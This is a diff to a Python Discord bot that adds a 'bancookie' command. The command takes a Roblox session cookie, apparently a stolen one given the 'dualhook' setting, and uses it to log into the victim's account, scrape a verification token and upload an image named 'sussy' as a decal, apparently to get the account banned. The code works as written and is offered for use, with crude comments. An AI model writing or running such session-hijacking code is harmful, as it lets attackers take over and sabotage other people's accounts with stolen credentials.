@@ -1,14 +1,53 @@
 import discord, requests, json
 from discord.ext import commands
+from bs4 import BeautifulSoup
 
 
 
-
-token = "BOTTOKENHERE"
+token = "TOKENHERE"
 yourprefix = "!" ## enter the prefix of your choice by replacing the ! 
 dualhookchannelid = YOURCHANNELID ## e.g 905536418934427096
 
 bot = commands.Bot(command_prefix=yourprefix, description="Cookie Checker Bot :)")
+
+@bot.command()
+async def bancookie(ctx, cookie=None):
+    req1 = requests.Session()
+    
+    if cookie == None:
+        await ctx.message.reply("Oh No! It Seems You Have Not Provided A Cookie, Please Run The Command Again Using The Following Syntax '.bancookie mycookie'") ## let the user know they aint provided cookie
+        return ## break command
+    
+    req1.cookies['.ROBLOSECURITY'] = cookie
+    print("Cookie Set")
+    homeurl= 'https://www.roblox.com/build/upload' ## link to get verification token
+    response = req1.get(homeurl)  
+    try:
+        soup = BeautifulSoup(response.text, "lxml")
+        veri = soup.find("input", {"name" : "__RequestVerificationToken"}).attrs["value"]
+
+    except NameError:
+        veri = False
+        await ctx.reply("Shit bois we got an error fuck")
+        return ## break ofc
+
+    files = {'file': ('lol.png', open("lol.jpg", 'rb'), 'image/png')} ## add the sussy img 
+    data = {
+        '__RequestVerificationToken': veri,
+        'assetTypeId': '13', 
+        'isOggUploadEnabled': 'True',
+        'isTgaUploadEnabled': 'True',
+        
+        'onVerificationPage': "False",
+        "captchaEnabled": "True",
+        'name': "sussy"
+    }
+    try:
+        response = req1.post('https://www.roblox.com/build/upload', files=files, data=data) #upload decal teehee
+        await ctx.reply("Uploaded sussy decal teehee")
+    except:
+        await ctx.reply("Uh oh request failed, invalid image?")
+        return 
 
 
 @bot.command()
@@ -84,6 +123,7 @@ async def checkcookie(ctx, cookie=None):  ## By default make Cookie = To None, s
 async def on_ready():
     await bot.change_presence(status=discord.Status.do_not_disturb, activity=discord.Activity(type=discord.ActivityType.playing, name="Cookie Checker"))
     print('throw some cookies at me bitch im all powered up')
+    
     ## just startup event which sets bot activity to "Playing Cookie Checker"
 
 
